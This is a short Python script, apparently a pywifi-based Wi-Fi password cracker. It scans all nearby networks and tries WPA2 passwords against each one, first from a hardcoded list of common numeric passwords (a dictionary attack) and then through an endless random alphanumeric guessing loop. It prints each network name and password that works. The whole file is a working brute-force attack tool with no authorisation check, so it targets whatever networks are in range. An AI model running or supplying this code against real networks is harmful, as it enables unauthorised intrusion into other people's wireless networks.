from pywifi import *
import time
import random

passwords = [
    "12345678", "123456789", "1234567890", "111111111", "888888888",
    "000000000", "5555444422", "6666688888", "1234512345", "0009999999" ]

def scan_profile(iface, timeout = 3):
    iface.scan()
    time.sleep(timeout)
    return iface.scan_results()

def create_profile(ssid, password):
    new_profile = Profile()
    new_profile.akm.append(const.AKM_TYPE_WPA2PSK)
    new_profile.cipher = const.CIPHER_TYPE_CCMP
    new_profile.ssid = ssid
    new_profile.key = password
    return new_profile

def connect_profile(profile, face):
    face.remove_all_network_profiles()
    face.connect(face.add_network_profile(profile))
    while (face.status() == const.IFACE_CONNECTING):
        time.sleep(0.1)
    return (face.status() == const.IFACE_CONNECTED)

def guess_password(guess):
    password = ""
    length = random.randint(8,10)
    for i in range (length):
        password += guess[random.randint(0, len(guess)-1)]
    return password

if __name__ == "__main__":
    # get all availble networks
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    profiles = scan_profile(iface)
    
    #==============================================================================================
    
    # dictionary attack
    for password in passwords:
        for profile in profiles:
            new_profile = create_profile(profile.ssid, password)
            success = connect_profile(new_profile, iface)
            if success:
                print(profile.ssid, password)
                break

    #==============================================================================================

    # guessing attack
    guess = "0123456789abcdefghijklmnopqrstuvwxyz"
    random.seed(time.time())
    while (1):
        password = guess_password(guess)
        for profile in profiles:
            new_profile = create_profile(profile.ssid, password)
            success = connect_profile(new_profile, iface)
            if success:
                print(profile.ssid, password)
                break
                
    #==============================================================================================
    
    print("=====END=====")
    iface.disconnect()
